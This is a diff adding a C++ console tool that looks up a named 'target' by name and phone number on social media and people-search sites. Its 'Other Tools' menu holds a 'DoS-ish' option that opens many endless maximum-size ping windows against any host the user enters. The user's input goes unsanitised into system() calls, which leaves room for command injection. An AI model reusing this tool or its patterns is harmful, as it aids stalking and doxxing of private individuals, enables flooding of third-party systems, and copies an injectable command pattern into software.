@@ -1,0 +1,328 @@
+/*/credit me: https://https://github.com/ImSoBored420/
+* this one's more readable and stuff
+* also easier to edit because of the higher level of abstraction
+* twerp
+/*/
+#include <iostream>
+#include <string>
+#include <vector>
+
+void facebook(std::string, std::string);
+void twitter(std::string, std::string);
+void whitepages(std::string, std::string, int);
+void google(std::string, std::string);
+void usphonelookup(std::string);
+void searchpeoplefree(std::string, std::string, int);
+void truepeoplesearch(std::string, std::string, int);
+void experimental(std::string, std::string);
+void moreStuff();
+
+const std::vector<std::string> webNames = {"https://www.facebook.com/search/top/?q=", "https://twitter.com/search?q=", "https://www.whitepages.com/name/", "https://www.whitepages.com/phone/",
+    "https://www.google.com/search?q=", "https://www.usphonebook.com/", "https://www.searchpeoplefree.com/find/", "https://www.searchpeoplefree.com/phone-lookup/find/",
+    "https://www.truepeoplesearch.com/results?name=", "https://www.truepeoplesearch.com/resultphone?phoneno="
+};
+
+bool running = true;
+
+int main()
+{
+    std::cout << ("\033[1;35m\n"
+        "__________.             _____       _____  _____.__\n"
+        "|    |/ _|_____________/ ____\\_ ___/ ____\\/ ____\\  |   ____\n"
+        "|     <_/ __  \\_ __ \\    __\\ | \\     __\\   __\\  |  | _/ __ \\ \n"
+        "|    | \\  ___/|  | \\/|  | |  |  /|  |   |  |    |  |_\\  ___/\n"
+        "|____|__\\___  >__|   |__| |____/ |__|   |__|    |____/\\___ >\n"
+        "       \\/   \\/                                            \\/\n"
+        "©2024 Inf Potentiality\n\n"
+    );
+
+    while (running)
+    {
+        std::cout << ("\033[1;m\n"
+            "==============================\n"
+            "\n"
+            "\033[1;34m1. Facebook \n"
+            "2. Twitter \n"
+            "3. Whitepages \n"
+            "4. Google \n"
+            "5. UsPhoneLookup \n"
+            "6. Searchpeoplefree \n"
+            "7. Truepeoplesearch  \n"
+            "98. Experimental (all services) \n"
+            "\033[1;m\n"
+            "==============================\n"
+            "\033[1;36m99. About\033[1;33m   100. Other Tools    0. Exit\033[1;m\n\n"
+        );
+
+        int menu;
+        int nameNum;
+        std::string name;
+        std::string num;
+
+        std::cout << "\033[1;m Input service: ";
+        std::cin >> menu;
+
+        if (menu > 0 && menu < 99) 
+        {
+            std::cout << "PLEASE NOTE: Many of these services rely on either names or numbers, "
+                "so the chosen service may not work if one or both of the inputs are left blank." << std::endl;
+            std::cout << "What is their name? (ENTER for none): ";
+            std::getline(std::cin >> std::ws, name);
+            std::cout << name << std::endl;
+            std::cout << "What is their phone number? (ENTER for none): ";
+            std::getline(std::cin >> std::ws, num);
+            std::cout << num << std::endl;
+        }
+
+        switch (menu)
+        {
+        case 1:
+            facebook(name, num);
+            break;
+
+        case 2:
+            twitter(name, num);
+            break;
+
+        case 3:
+            std::cout << "This service takes only either the name or number of a target; not both." << std::endl;
+
+            while (running)
+            {
+                std::cout << "Enter '1' if you would like to search the name, or '2' if you would like to search the number: ";
+                std::cin >> nameNum;
+
+                if (nameNum == 1 || nameNum == 2)
+                {
+                    whitepages(name, num, nameNum);
+                    break;
+                }
+                else 
+                {
+                    std::cout << "ERROR: Choice not either '1' or '2'" << std::endl;
+                }
+            }
+            break;
+
+        case 4:
+            google(name, num);
+            break;
+
+        case 5:
+            usphonelookup(num);
+            break;
+
+        case 6:
+        
+            while (running)
+            {
+                std::cout << "Enter '1' if you would like to search the name, or '2' if you would like to search the number: ";
+                std::cin >> nameNum;
+
+                if (nameNum == 1 || nameNum == 2)
+                {
+                    searchpeoplefree(name, num, nameNum);
+                    break;
+                }
+                else
+                {
+                    std::cout << "ERROR: Choice not either '1' or '2'" << std::endl;
+                }
+            }
+            break;
+
+        case 7:
+
+            while (running)
+            {
+                std::cout << "Enter '1' if you would like to search the name, or '2' if you would like to search the number: ";
+                std::cin >> nameNum;
+
+                if (nameNum == 1 || nameNum == 2)
+                {
+                    truepeoplesearch(name, num, nameNum);
+                    break;
+                }
+                else {
+                    std::cout << "ERROR: Choice not either '1' or '2'" << std::endl;
+                }
+            }
+            break;
+
+        case 98: // TODO: add all func
+            experimental(name, num);
+            break;
+
+        case 99:
+            std::cout << "\033[1;34mOne of the most simplistic and sub-par lookup tools ever made, mostly out of boredom. "
+                "Input the name and /or number(s) of who you wanna find, and the OSINT gods bestow their knowledege upon thee(if any).\033[1; m";
+            break;
+
+        case 100:
+            moreStuff();
+            break;
+
+        case 0:
+            std::cout << "\033[1;34mThanks for using this!\n";
+            std::cout << "\033[1;34mClosing...\033[1;m\n";
+
+            running = false;
+        }
+    }
+    return 0; //cleanup func here
+}
+
+void facebook(std::string name, std::string num)
+{
+    system(("start " + webNames[0] + name + "+" + num).c_str());
+}
+
+void twitter(std::string name, std::string num)
+{
+    system(("start " + webNames[1] + name + "+" + num).c_str());
+}
+
+void whitepages(std::string name, std::string num, int nameNum) 
+{
+    if (nameNum == 1)
+    {
+        system(("start " + webNames[2] + name).c_str());
+    }
+    else if (nameNum == 2)
+    {
+        system(("start " + webNames[3] + num).c_str());
+    }
+}
+
+void google(std::string name, std::string num)
+{
+    system(("start " + webNames[4] + name + "+" + num).c_str());
+}
+
+void usphonelookup(std::string num)
+{
+    system(("start " + webNames[5] + num).c_str());
+}
+
+void searchpeoplefree(std::string name, std::string num, int nameNum)
+{
+    if (nameNum == 1)
+    {
+        system(("start " + webNames[6] + name).c_str());
+    }
+    else if (nameNum == 2)
+    {
+        system(("start " + webNames[7] + num).c_str());
+    }
+
+}
+
+void truepeoplesearch(std::string name, std::string num, int nameNum)
+{
+    if (nameNum == 1)
+    {
+        system(("start " + webNames[8] + name).c_str());
+    }
+    else if (nameNum == 2)
+    {
+        system(("start " + webNames[9] + num).c_str());
+    }
+}
+
+void experimental(std::string name, std::string num)
+{
+    system(("start " + webNames[0] + name + "+" + num).c_str());
+    system(("start " + webNames[1] + name + "+" + num).c_str());
+    system(("start " + webNames[2] + name).c_str());
+    system(("start " + webNames[3] + num).c_str());
+    system(("start " + webNames[4] + name + "+" + num).c_str());
+    system(("start " + webNames[5] + num).c_str());
+    system(("start " + webNames[6] + name).c_str());
+    system(("start " + webNames[7] + num).c_str());
+    system(("start " + webNames[8] + name).c_str());
+    system(("start " + webNames[9] + num).c_str());
+}
+
+void moreStuff()
+{
+    std::cout << ("\033[0;32m\n"
+        "___  ___                     _          __  ___\n"
+        "|  \\/  |                    | |        / _|/ __|\n"
+        "| \\  / | ___  _ __ ___   ___| |_ _   _| |_| |_\n"
+        "| |\\/| |/ _ \\| '__/ _ \\ / __| __| | | |  _|  _|\n"
+        "| |  | | (_) | | |  __  \\__ \\ |_| |_| | | | |\n"
+        "|_|  |_|\\___/|_|  \\___| |___/\\__|\\____|_| |_|\n"
+        "Still ©2024 Inf Potentiality\n");
+
+    while (running)
+    {
+        std::cout << ("\033[1;m\n"
+            "==============================\n"
+            "\033[1;34m\n"
+            "1. DoS-ish\n"
+            "\033[1;m\n"
+            "==============================\n\n"
+            "\033[1;36m 99. About\033[1;33m 0. Exit\033[1;m\n\n"
+        );
+
+        int menu;
+        int bytes;
+        int instances;
+        std::string target;
+
+        std::cout << "\033[1; m Input service: ";
+        std::cin >> menu;
+
+        if (menu == 0)
+        {
+            std::cout << "\033[1;34mReturning to menu...";
+            break;
+        }
+
+        switch (menu)
+        {
+        case 1:
+            std::cout << "This program attempts a Denial of Service attack on whatever target you want." << std::endl;
+            std::cout << "\033[1;33mDISCLAIMER: I am not responsible for misuse of this program. Only use this program with express permission from the person this is used on." << std::endl;
+
+            std::cout << "\033[1;mInput target: ";
+            std::cin >> target;
+
+            while (running)
+            {
+                std::cout << "How many bytes of data per ping should be sent? (max 65500): ";
+                std::cin >> bytes;
+
+                if (bytes > 65500 || bytes <= 0)
+                {
+                    std::cout << "ERROR: invalid byte size" << std::endl;
+                }
+                else
+                {
+                    std::cout << "How many instances of the ping command should be initialized?: ";
+                    std::cin >> instances;
+
+                    if (instances > 0)
+                    {
+                        break;
+                    }
+                    else
+                    {
+                        std::cout << "ERROR: invalid instance number" << std::endl;
+                    }
+                }
+            }
+
+            for (int i = 0; i < instances; i++)
+            {
+                system(("start cmd /k ping " + target + " -l " + std::to_string(bytes) + " -t").c_str());
+            }
+            break;
+
+        case 99:
+            std::cout << "This is a continuation to the unpopular program by me, Kerfuffle. "
+            "Now instead of JUST info gathering, there are even more sub-par things to do!" << std::endl;
+            break;
+        }
+    }
+}
